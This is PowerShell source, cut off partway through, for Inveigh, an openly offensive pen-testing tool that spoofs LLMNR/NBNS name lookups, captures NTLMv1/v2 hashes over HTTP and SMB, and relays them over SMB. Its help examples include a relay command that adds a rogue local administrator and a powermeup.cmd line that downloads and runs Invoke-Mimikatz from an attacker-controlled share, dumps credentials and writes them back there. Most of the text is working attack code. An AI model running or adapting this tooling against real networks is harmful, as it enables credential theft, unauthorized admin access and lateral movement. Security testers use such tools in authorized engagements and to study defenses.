Function Invoke-Inveigh
{
<#
.SYNOPSIS
Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with challenge/response capture over HTTP(S)/SMB and NTLMv2 HTTP to SMB relay.
.DESCRIPTION
Inveigh is a Windows PowerShell LLMNR/NBNS spoofer designed to assist penetration testers that find themselves limited to a Windows system.
This can commonly occur while performing standard post exploitation, phishing attacks, USB drive attacks, VLAN pivoting, or simply being restricted to a Windows system as part of client imposed restrictions.
.PARAMETER IP
Specify a specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if the 'SpoofIP' parameter is not set.
.PARAMETER SpooferIP
Specify an IP address for LLMNR/NBNS spoofing. This parameter is only necessary when redirecting victims to a system other than the Inveigh host. 
.PARAMETER LLMNR
Default = Enabled: Enable/Disable LLMNR spoofing.
.PARAMETER NBNS
Default = Disabled: Enable/Disable NBNS spoofing.
.PARAMETER NBNSTypes
Default = 00,20: Comma separated list of NBNS types to spoof. Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name
.PARAMETER Repeat
Default = Enabled: Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured.
.PARAMETER SpoofList
Default = All: Comma separated list of hostnames to spoof with LLMNR and NBNS.
.PARAMETER HTTP
Default = Enabled: Enable/Disable HTTP challenge/response capture.
.PARAMETER HTTPS
Default = Disabled: Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store and attached to port 443.
If the script does not exit gracefully, execute "netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal" in the cert store.
.PARAMETER SMB
Default = Enabled: Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still direct targets to the host system's SMB server.
Block TCP ports 445/139 if you need to prevent login requests from being processed by the Inveigh host.  
.PARAMETER Challenge
Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request.
.PARAMETER MachineAccounts
Default = Disabled: Enable/Disable showing NTLM challenge/response captures from machine accounts.
.PARAMETER ForceWPADAuth
Default = Enabled: Matches Responder option to Enable/Disable authentication for wpad.dat GET requests. Disabling can prevent browser login prompts.
.PARAMETER SMBRelay
Default = Disabled: Enable/Disable SMB relay.
.PARAMETER SMBRelayTarget
IP address of system to target for SMB relay.
.PARAMETER SMBRelayCommand
Command to execute on SMB relay target.
.PARAMETER SMBRelayUsernames
Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and domain\username format. 
.PARAMETER SMBRelayAutoDisable
Default = Enable: Automaticaly disable SMB relay after a successful command execution on target.
.PARAMETER SMBRelayNetworkTimeout
Default = No Timeout: Set the duration in seconds that Inveigh will wait for a reply from the SMB relay target after each packet is sent.
.PARAMETER ConsoleOutput
Default = Disabled: Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell.
.PARAMETER FileOutput
Default = Disabled: Enable/Disable real time file output.
.PARAMETER StatusOutput
Default = Enabled: Enable/Disable statup and shutdown messages.
.PARAMETER OutputStreamOnly
Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh through a shell that does not return other output streams.
Note that you will not see the various yellow warning messages if enabled.
.PARAMETER OutputDir
Default = Working Directory: Set an output directory for log and capture files.
.PARAMETER ShowHelp
Default = Enabled: Enable/Disable the help messages at startup.
.PARAMETER RunTime
Set the run time duration in minutes.
.PARAMETER Tool
Default = 0: Enable/Disable features for better operation through external tools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire   
.EXAMPLE
Import-Module .\Inveigh.psd1;Invoke-Inveigh
Import full module and execute with all default settings.
.EXAMPLE
. ./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10
Dot source load and execute specifying a specific local listening/spoofing IP.
.EXAMPLE
Invoke-Inveigh -IP 192.168.1.10 -HTTP N
Execute specifying a specific local listening/spoofing IP and disabling HTTP challenge/response.
.EXAMPLE
Invoke-Inveigh -Repeat N -ForceWPADAuth N -SpoofList host1,host2
Execute with the stealthiest options.
.EXAMPLE
Invoke-Inveigh -HTTP N -LLMNR N
Execute with LLMNR/NBNS spoofing disabled and challenge/response capture over SMB only. This may be useful for capturing non-Kerberos authentication attempts on a file server.
.EXAMPLE
Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
Execute specifying a specific local listening IP and a LLMNR/NBNS spoofing IP on another subnet. This may be useful for sending traffic to a controlled Linux system on another subnet.
.EXAMPLE
Invoke-Inveigh -SMBRelay y -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Summer2015 /add && net localgroup administrators Dave /add"
Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay target.  
.EXAMPLE
Invoke-Inveigh -SMBRelay Y -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "powershell \\192.168.2.50\temp$\powermeup.cmd"
Execute with SMB relay enabled and using Mubix's powermeup.cmd method of launching Invoke-Mimikatz.ps1 and uploading output. In this example, a hidden anonymous share containing Invoke-Mimikatz.ps1 is employed on the Inveigh host system. 
Powermeup.cmd contents used for this example:
powershell "IEX (New-Object Net.WebClient).DownloadString('\\192.168.2.50\temp$\Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds > \\192.168.2.50\temp$\%COMPUTERNAME%.txt 2>&1"
Original version:
https://github.com/mubix/post-exploitation/blob/master/scripts/mass_mimikatz/powermeup.cmd
.NOTES
1. An elevated administrator or SYSTEM shell is needed.
2. Currently supports IPv4 LLMNR/NBNS spoofing and HTTP/SMB NTLMv1/NTLMv2 challenge/response capture.
3. LLMNR/NBNS spoofing is performed through sniffing and sending with raw sockets.
4. SMB challenge/response captures are performed by sniffing over the host system's SMB service.
5. HTTP challenge/response captures are performed with a dedicated listener.
6. The local LLMNR/NBNS services do not need to be disabled on the host system.
7. LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.
8. Kerberos should downgrade for SMB authentication due to spoofed hostnames not being valid in DNS.
9. Ensure that the LMMNR,NBNS,SMB,HTTP ports are open within any local firewall on the host system.
10. If you copy/paste challenge/response captures from output window for password cracking, remove carriage returns.
11. SMB relay support is experimental at this point, use caution if employing on a pen test.
.LINK
https://github.com/Kevin-Robertson/Inveigh
#>

# Default parameter values can be modified below 
param
( 
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$IP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SpooferIP = "",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTP="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTPS="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMB="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$LLMNR="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$NBNS="N",
    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][array]$NBNSTypes=@("00","20"),
    [parameter(Mandatory=$false)][array]$SpoofList="",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][string]$Challenge="",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMBRelay="N",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SMBRelayTarget ="",
    [parameter(Mandatory=$false)][array]$SMBRelayUsernames,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMBRelayAutoDisable="Y",
    [parameter(Mandatory=$false)][int]$SMBRelayNetworkTimeout="",
    [parameter(Mandatory=$false)][string]$SMBRelayCommand = "",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$Repeat="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ForceWPADAuth="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ConsoleOutput="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$FileOutput="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$StatusOutput="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$OutputStreamOnly="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$MachineAccounts="N",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][string]$OutputDir="",
    [parameter(Mandatory=$false)][int]$RunTime="",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][string]$Tool="0",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ShowHelp="Y",
    [parameter(ValueFromRemainingArguments=$true)] $invalid_parameter
)

if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}

if(!$IP)
{ 
    $IP = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)
}

if(!$SpooferIP)
{
    $SpooferIP = $IP  
}

if($SMBRelay -eq 'y')
{
    if(!$SMBRelayTarget)
    {
        Throw "You must specify an -SMBRelayTarget if enabling -SMBRelay"
    }

    if(!$SMBRelayCommand)
    {
        Throw "You must specify an -SMBRelayCommand if enabling -SMBRelay"
    }
}

if(!$OutputDir)
{ 
    $output_directory = $PWD.Path
}
else
{
    $output_directory = $OutputDir
}

if(!$inveigh)
{
    $global:inveigh = [hashtable]::Synchronized(@{})
    $inveigh.log = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
    $inveigh.IP_capture_list = @()
    $inveigh.SMBRelay_failed_list = @()
}

$inveigh.running = $false
$inveigh.sniffer_socket = $null

if($inveigh.HTTP_listener.IsListening)
{
    $inveigh.HTTP_listener.Stop()
    $inveigh.HTTP_listener.Close()
}

$inveigh.console_queue = New-Object System.Collections.ArrayList
$inveigh.status_queue = New-Object System.Collections.ArrayList
$inveigh.log_file_queue = New-Object System.Collections.ArrayList
$inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
$inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
$inveigh.certificate_thumbprint = "76a49fd27011cf4311fb6914c904c90a89f3e4b2"
$inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
$inveigh.console_output = $false
$inveigh.console_input = $true
$inveigh.file_output = $false
$inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
$inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
$inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
$Inveigh.challenge = $Challenge
$inveigh.running = $true

if($StatusOutput -eq 'y')
{
    $inveigh.status_output = $true
}
else
{
    $inveigh.status_output = $false
}

if($OutputStreamOnly -eq 'y')
{
    $inveigh.output_stream_only = $true
}
else
{
    $inveigh.output_stream_only = $false
}

if($Tool -eq 1) # Metasploit Interactive PowerShell
{
    $inveigh.tool = 1
    $inveigh.output_stream_only = $true
    $inveigh.newline = ""
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) # PowerShell Empire
{
    $inveigh.tool = 2
    $inveigh.output_stream_only = $true
    $inveigh.console_input = $false
    $inveigh.newline = "`n"
    $ConsoleOutput = "Y"
    $ShowHelp = "N"
}
else
{
    $inveigh.tool = 0
    $inveigh.newline = ""
}

# Write startup messages
$inveigh.status_queue.add("Inveigh started at $(Get-Date -format 's')")|Out-Null
$inveigh.log.add("$(Get-Date -format 's') - Inveigh started") |Out-Null

if($FileOutput -eq 'y')
{
    "$(Get-Date -format 's') - Inveigh started" |Out-File $Inveigh.log_out_file -Append
}

$inveigh.status_queue.add("Listening IP Address = $IP") |Out-Null
$inveigh.status_queue.add("LLMNR/NBNS Spoofer IP Address = $SpooferIP")|Out-Null

if($LLMNR -eq 'y')
{
    $inveigh.status_queue.add("LLMNR Spoofing Enabled")|Out-Null
    $LLMNR_response_message = "- spoofed response has been sent"
}
else
{
    $inveigh.status_queue.add("LLMNR Spoofing Disabled")|Out-Null
    $LLMNR_response_message = "- LLMNR spoofing is disabled"
}

if($SpoofList -and ($LLMNR -eq 'y' -or $NBNS -eq 'y'))
{
    $spoof_list_output = $SpoofList -join ","
    $inveigh.status_queue.add("Spoofing only $spoof_list_output")|Out-Null
}

if($NBNS -eq 'y')
{
    $NBNSTypes_output = $NBNSTypes -join ","
    
    if($NBNSTypes.Count -eq 1)
    {
        $inveigh.status_queue.add("NBNS Spoofing Of Type $NBNSTypes_output Enabled")|Out-Null
    }
    else
    {
        $inveigh.status_queue.add("NBNS Spoofing Of Types $NBNSTypes_output Enabled")|Out-Null
    }
    
    $NBNS_response_message = "- spoofed response has been sent"
}
else
{
    $inveigh.status_queue.add("NBNS Spoofing Disabled")|Out-Null
    $NBNS_response_message = "- NBNS spoofing is disabled"
}

if($Repeat -eq 'n')
{
    $inveigh.repeat = $false
    $inveigh.status_queue.add("Spoof Repeating Disabled")|Out-Null
}
else
{
    $inveigh.repeat = $true
    $inveigh.IP_capture_list = @()
}

if($HTTP -eq 'y')
{
    $inveigh.HTTP = $true
    $inveigh.status_queue.add("HTTP Capture Enabled")|Out-Null
}
else
{
    $inveigh.HTTP = $false
    $inveigh.status_queue.add("HTTP Capture Disabled")|Out-Null
}

if($HTTPS -eq 'y')
{
    try
    {
        $inveigh.HTTPS = $true
        $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
        $certificate_store.Open('ReadWrite')
        $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
        $certificate.Import($PWD.Path + "\inveigh.pfx")
        $certificate_store.Add($certificate) 
        $certificate_store.Close()
        Invoke-Expression -command ("netsh http add sslcert ipport=0.0.0.0:443 certhash=" + $inveigh.certificate_thumbprint + " appid='{00112233-4455-6677-8899-AABBCCDDEEFF}'") > $null
        $inveigh.status_queue.add("HTTPS Capture Enabled")|Out-Null
    }
    catch
    {
        $certificate_store.Close()
        $HTTPS="N"
        $inveigh.HTTPS = $false
        $inveigh.status_queue.add("HTTPS Capture Disabled Due To Certificate Install Error")|Out-Null
    }
}
else
{
    $inveigh.status_queue.add("HTTPS Capture Disabled")|Out-Null
}

if($Challenge)
{
    $inveigh.status_queue.add("NTLM Challenge = $Challenge")|Out-Null
}

if($SMB -eq 'y')
{
    $inveigh.status_queue.add("SMB Capture Enabled")|Out-Null
}
else
{
    $inveigh.status_queue.add("SMB Capture Disabled")|Out-Null
}

if($MachineAccounts -eq 'n')
{
    $inveigh.status_queue.add("Ignoring Machine Accounts")|Out-Null
}

if($ForceWPADAuth -eq 'y')
{
    $inveigh.status_queue.add("Force WPAD Authentication Enabled")|Out-Null
}
else
{
    $inveigh.status_queue.add("Force WPAD Authentication Disabled")|Out-Null
}

if($ConsoleOutput -eq 'y')
{
    $inveigh.status_queue.add("Real Time Console Output Enabled")|Out-Null
    $inveigh.console_output = $true
}
else
{
    if($inveigh.tool -eq 1)
    {
        $inveigh.status_queue.add("Real Time Console Output Disabled Due To External Tool Selection")|Out-Null
    }
    else
    {
        $inveigh.status_queue.add("Real Time Console Output Disabled")|Out-Null
    }
}

if($FileOutput -eq 'y')
{
    $inveigh.status_queue.add("Real Time File Output Enabled")|Out-Null
    $inveigh.status_queue.add("Output Directory = $output_directory")|Out-Null
    $inveigh.file_output = $true
}
else
{
    $inveigh.status_queue.add("Real Time File Output Disabled")|Out-Null
}

if($RunTime -eq 1)
{
    $inveigh.status_queue.add("Run Time = $RunTime Minute")|Out-Null
}
elseif($RunTime -gt 1)
{
    $inveigh.status_queue.add("Run Time = $RunTime Minutes")|Out-Null
}

if($SMBRelay -eq 'n')
{

    if($ShowHelp -eq 'y')
    {
        $inveigh.status_queue.add("Use Get-Command -Noun Inveigh* to show available functions")|Out-Null
        $inveigh.status_queue.add("Run Stop-Inveigh to stop Inveigh")|Out-Null
        
        if($inveigh.console_output)
        {
            $inveigh.status_queue.add("Press any key to stop real time console output")|Out-Null
        }
    }
    if($inveigh.status_output)
    {
        while($inveigh.status_queue.Count -gt 0)
        {
            if($inveigh.output_stream_only)
            {
                write-output($inveigh.status_queue[0] + $inveigh.newline)
                $inveigh.status_queue.RemoveRange(0,1)
            }
            else
            {
                switch ($inveigh.status_queue[0])
                {
                    "Run Stop-Inveigh to stop Inveigh"
                    {
                        write-warning($inveigh.status_queue[0])
                        $inveigh.status_queue.RemoveRange(0,1)
                    }
                    default
                    {
                        write-output($inveigh.status_queue[0])
                        $inveigh.status_queue.RemoveRange(0,1)
                    }
                }
            }
        }
    }
}
else
{
    Invoke-InveighRelay -HTTP $HTTP -HTTPS $HTTPS -SMBRelayTarget $SMBRelayTarget -SMBRelayUsernames $SMBRelayUsernames -SMBRelayAutoDisable $SMBRelayAutoDisable -SMBRelayNetworkTimeout $SMBRelayNetworkTimeout -MachineAccounts $MachineAccounts -SMBRelayCommand $SMBRelayCommand -Tool $Tool -ShowHelp $ShowHelp 
}

# Begin ScriptBlocks

# Shared Basic Functions ScriptBlock
$shared_basic_functions_scriptblock =
{
    Function DataToUInt16($field)
    {
	   [Array]::Reverse($field)
	   return [BitConverter]::ToUInt16($field,0)
    }

    Function DataToUInt32($field)
    {
	   [Array]::Reverse($field)
	   return [BitConverter]::ToUInt32($field,0)
    }

    Function DataLength
    {
        param ([int]$length_start,[byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToInt16($string_extract_data[$length_start..($length_start + 1)],0)
        return $string_length
    }

    Function DataToString
    {
        param ([int]$string_length,[int]$string2_length,[int]$string3_length,[int]$string_start,[byte[]]$string_extract_data)

        $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length-1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
        return $string_extract
    }
}

# SMB NTLM Functions ScriptBlock - function for parsing NTLM challenge/response
$SMB_NTLM_functions_scriptblock =
{
    Function SMBNTLMChallenge
    {
        param ([byte[]]$payload_bytes)

        $payload = [System.BitConverter]::ToString($payload_bytes)
        $payload = $payload -replace "-",""
        $NTLM_index = $payload.IndexOf("4E544C4D53535000")

        if($payload.SubString(($NTLM_index + 16),8) -eq "02000000")
        {
            $NTLM_challenge = $payload.SubString(($NTLM_index + 48),16)
        }

        return $NTLM_challenge
    }

    Function SMBNTLMResponse
    {
        param ([byte[]]$payload_bytes)

        $payload = [System.BitConverter]::ToString($payload_bytes)
        $payload = $payload -replace "-",""
        $NTLM_index = $payload.IndexOf("4E544C4D53535000")
        $NTLM_bytes_index = $NTLM_index / 2

        if($payload.SubString(($NTLM_index + 16),8) -eq "03000000")
        {
            $LM_length = DataLength ($NTLM_bytes_index + 12) $payload_bytes
            $LM_offset = $payload_bytes[($NTLM_bytes_index + 16)]

            if($LM_length -ge 24)
            {
                $NTLM_length = DataLength ($NTLM_bytes_index + 20) $payload_bytes
                $NTLM_offset = $payload_bytes[($NTLM_bytes_index + 24)]

                $NTLM_domain_length = DataLength ($NTLM_bytes_index + 28) $payload_bytes
                $NTLM_domain_offset = DataLength ($NTLM_bytes_index + 32) $payload_bytes
                $NTLM_domain_string = DataToString $NTLM_domain_length 0 0 ($NTLM_bytes_index + $NTLM_domain_offset) $payload_bytes

                $NTLM_user_length = DataLength ($NTLM_bytes_index + 36) $payload_bytes
                $NTLM_user_string = DataToString $NTLM_user_length $NTLM_domain_length 0 ($NTLM_bytes_index + $NTLM_domain_offset) $payload_bytes

                $NTLM_host_length = DataLength ($NTLM_bytes_index + 44) $payload_bytes
                $NTLM_host_string = DataToString $NTLM_host_length $NTLM_user_length $NTLM_domain_length ($NTLM_bytes_index + $NTLM_domain_offset) $payload_bytes

                if(([BitConverter]::ToString($payload_bytes[($NTLM_bytes_index + $LM_offset)..($NTLM_bytes_index + $LM_offset + $LM_length - 1)]) -replace "-","") -eq ("00" * $LM_length))
                {
                    $NTLMv2_response = [System.BitConverter]::ToString($payload_bytes[($NTLM_bytes_index + $NTLM_offset)..($NTLM_bytes_index + $NTLM_offset + $NTLM_length - 1)]) -replace "-",""
                    $NTLMv2_response = $NTLMv2_response.Insert(32,':')
                    $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response

                    if(($source_IP -ne $IP) -and (($MachineAccounts -eq 'y') -or (($MachineAccounts -eq 'n') -and (-not $NTLM_user_string.EndsWith('$')))))
                    {      
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")])   
                        $inveigh.NTLMv2_file_queue.add($NTLMv2_hash)
                        $inveigh.NTLMv2_list.add($NTLMv2_hash)
                        $inveigh.console_queue.add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv2_hash")

                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.add("SMB NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
                        }
                    }
                }
                else
                {
                    $NTLMv1_response = [System.BitConverter]::ToString($payload_bytes[($NTLM_bytes_index + $LM_offset)..($NTLM_bytes_index + $LM_offset + $NTLM_length + $LM_length - 1)]) -replace "-",""
                    $NTLMv1_response = $NTLMv1_response.Insert(48,':')
                    $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLMv1_response + ":" + $NTLM_challenge

                    if(($source_IP -ne $IP) -and (($MachineAccounts -eq 'y') -or (($MachineAccounts -eq 'n') -and (-not $NTLM_user_string.EndsWith('$')))))
                    {    
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")])
                        $inveigh.NTLMv1_file_queue.add($NTLMv1_hash)
                        $inveigh.NTLMv1_list.add($NTLMv1_hash)
                        $inveigh.console_queue.add("$(Get-Date -format 's') SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv1_hash")

                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.add("SMB NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file)
                        }
  
                    }
                }

                if (($inveigh.IP_capture_list -notcontains $source_IP) -and (-not $NTLM_user_string.EndsWith('$')) -and (!$inveigh.repeat) -and ($source_IP -ne $IP))
                {
                    $inveigh.IP_capture_list += $source_IP
                }
            }
        }
    }
}

# HTTP/HTTPS Server ScriptBlock - HTTP/HTTPS listener
$HTTP_scriptblock = 
{ 
    param ($MachineAccounts,$ForceWPADAuth)

    Function NTLMChallengeBase64
    {

        $HTTP_timestamp = Get-Date
        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
        $HTTP_timestamp = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_timestamp))
        $HTTP_timestamp = $HTTP_timestamp.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}

        if($Inveigh.challenge)
        {
            $HTTP_challenge = $Inveigh.challenge
            $HTTP_challenge_bytes = $Inveigh.challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        }
        else
        {
            $HTTP_challenge_bytes = [String](1..8 | % {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ', ''
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        }

        $inveigh.HTTP_challenge_queue.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + ',' + $HTTP_challenge) |Out-Null

        [byte[]]$HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,0x00,0x00,0x00,0x05,0x82,0x89,0xa2)`
            + $HTTP_challenge_bytes`
            + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00)`
            + (0x02,0x00,0x06,0x00,0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00)`
            + (0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,0x00,0x68,0x00,0x6f,0x00)`
            + (0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00)`
            + (0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00)`
            + $HTTP_timestamp`
            + (0x00,0x00,0x00,0x00,0x0a,0x0a)

        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        $NTLM = 'NTLM ' + $NTLM_challenge_base64
        $NTLM_challenge = $HTTP_challenge
        
        Return $NTLM

    }
    
    while($inveigh.running)
    {
        $inveigh.context = $inveigh.HTTP_listener.GetContext() 
        $inveigh.request = $inveigh.context.Request
        $inveigh.response = $inveigh.context.Response
        $inveigh.message = ''
        $NTLM = 'NTLM'
        
        if($inveigh.request.IsSecureConnection)
        {
            $HTTP_type = "HTTPS"
        }
        else
        {
            $HTTP_type = "HTTP"
        }
        
        
        if (($inveigh.request.RawUrl -match '/wpad.dat') -and ($ForceWPADAuth -eq 'n'))
        {
            $inveigh.response.StatusCode = 200
        }
        else
        {
            $inveigh.response.StatusCode = 401
        }
            
        [string]$authentication_header = $inveigh.request.headers.getvalues('Authorization')
        
        if($authentication_header.startswith('NTLM '))
        {
            $authentication_header = $authentication_header -replace 'NTLM ',''
            [byte[]] $HTTP_request_bytes = [System.Convert]::FromBase64String($authentication_header)
            $inveigh.response.StatusCode = 401
            
            if($HTTP_request_bytes[8] -eq 1)
            {   
                $inveigh.response.StatusCode = 401
                $NTLM = NTLMChallengeBase64 
            }
            elseif($HTTP_request_bytes[8] -eq 3)
            {
                $NTLM = 'NTLM'
                $HTTP_NTLM_offset = $HTTP_request_bytes[24]
                $HTTP_NTLM_length = DataLength 22 $HTTP_request_bytes
                $HTTP_NTLM_domain_length = DataLength 28 $HTTP_request_bytes
                $HTTP_NTLM_domain_offset = DataLength 32 $HTTP_request_bytes
                
                [string]$NTLM_challenge = $inveigh.HTTP_challenge_queue -like $inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + '*'
                $inveigh.HTTP_challenge_queue.Remove($NTLM_challenge)
                $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(","))+1)
                       
                if($HTTP_NTLM_domain_length -eq 0)
                {
                    $HTTP_NTLM_domain_string = ''
                }
                else
                {  
                    $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_length 0 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                } 
                    
                $HTTP_NTLM_user_length = DataLength 36 $HTTP_request_bytes
                $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                        
                $HTTP_NTLM_host_length = DataLength 44 $HTTP_request_bytes
                $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length $HTTP_NTLM_domain_offset $HTTP_request_bytes
        
                if($HTTP_NTLM_length -eq 24) # NTLMv1
                {
                    $NTLM_type = "NTLMv1"
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(48,':')
                    $inveigh.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
                    
                    if((($NTLM_challenge -ne '') -and ($NTLM_response -ne '')) -and (($MachineAccounts -eq 'y') -or (($MachineAccounts -eq 'n') -and (-not $HTTP_NTLM_user_string.EndsWith('$')))))
                    {    
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $inveigh.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + ")")])
                        $inveigh.NTLMv1_file_queue.add($inveigh.HTTP_NTLM_hash)
                        $inveigh.NTLMv1_list.add($inveigh.HTTP_NTLM_hash)
